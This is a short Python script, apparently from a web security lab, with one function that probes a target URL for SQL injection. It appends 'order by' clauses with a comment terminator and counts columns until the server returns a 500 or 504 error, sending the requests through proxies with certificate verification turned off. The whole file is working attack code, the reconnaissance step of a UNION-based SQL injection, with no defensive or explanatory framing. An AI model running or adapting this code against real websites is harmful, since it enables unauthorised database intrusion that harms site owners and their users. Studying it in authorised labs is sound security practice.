from proxies import proxies

# Determine the amount of columns using order-by clauses
def sqli_count_columns(session, url):
    errored = False
    col_count = 0
    while not errored:
        if col_count >= 50:
            print("[!] Error with script")
            return False
        uri = url + "'+order+by+{}--".format(col_count + 1)
        res = session.get(uri, verify=False, proxies=proxies)
        print("[~] Status Code: " + str(res.status_code) + ". \n[~] URL: " + uri)
        if res.status_code in [500, 504]:
            errored = True
        else:
            col_count = col_count + 1

    print("[+] Column count: " + str(col_count))

    return col_count
